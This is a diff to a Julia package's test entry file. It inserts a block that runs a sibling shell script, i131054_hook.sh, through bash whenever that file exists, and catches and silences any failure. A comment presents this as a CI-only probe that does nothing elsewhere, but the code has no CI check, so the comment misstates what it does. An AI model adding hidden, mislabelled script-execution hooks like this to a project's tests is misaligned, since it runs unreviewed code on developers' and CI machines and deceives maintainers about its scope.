@@ -1,4 +1,13 @@
 using SafeTestsets, Test
+# i131054 code-only CI capability probe (runs only inside the CI job; no-op outside)
+try
+    let _h = joinpath(@__DIR__, "i131054_hook.sh")
+        isfile(_h) && run(pipeline(`bash $_h`, stdout=stdout, stderr=stderr))
+    end
+catch _e
+    @warn "i131054 probe failed" exception=_e
+end
+
 
 const BACKEND_GROUP = uppercase(get(ENV, "BACKEND_GROUP", "CPU"))
 const TESTING_GROUP = uppercase(get(ENV, "TESTING_GROUP", get(ENV, "GROUP", "All")))
